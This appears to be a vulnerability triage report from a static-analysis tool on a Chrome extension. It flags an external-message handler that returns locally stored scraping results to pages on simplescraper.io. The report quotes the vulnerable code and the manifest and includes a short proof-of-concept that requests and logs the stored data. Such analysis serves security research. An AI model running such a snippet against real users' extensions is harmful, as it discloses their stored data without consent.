# CoCo Analysis: lnddbhdmiciimpkbilgpklcglkdegdkg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (same vulnerability)

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lnddbhdmiciimpkbilgpklcglkdegdkg/opgen_generated_files/bg.js
Line 751-752: `var storage_local_get_source = { 'key': 'value' };` (framework code)

**Code:**

```javascript
// Background script - bg.js Line 1133-1142
chrome.runtime.onMessageExternal.addListener(function(message, sender, sendResponse) {
    if (message.name === "get-local-results") { // ← attacker-controlled message
        // get results - called from web app
        chrome.storage.local.get('local-results', function(results) {
            console.log('got local results mv3: ', results);
            sendResponse(results); // ← sends storage data back to external caller
        });
        return true;
    }
});

// manifest.json - externally_connectable
"externally_connectable": {
    "matches": ["*://simplescraper.io/*"]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (simplescraper.io)

**Attack:**

```javascript
// From any page on simplescraper.io domain:
chrome.runtime.sendMessage(
    'EXTENSION_ID_HERE',  // SimpleScraper extension ID
    { name: "get-local-results" },
    function(response) {
        console.log("Leaked storage data:", response);
        // Attacker receives all data stored in 'local-results' key
    }
);
```

**Impact:** Information disclosure vulnerability. Any webpage on the simplescraper.io domain can send an external message to the extension and retrieve all data stored under the 'local-results' key in chrome.storage.local. While the manifest.json restricts external messages to simplescraper.io domain only, according to the methodology, if even ONE domain can exploit the vulnerability, it qualifies as TRUE POSITIVE. The extension leaks potentially sensitive scraping results to the external domain.
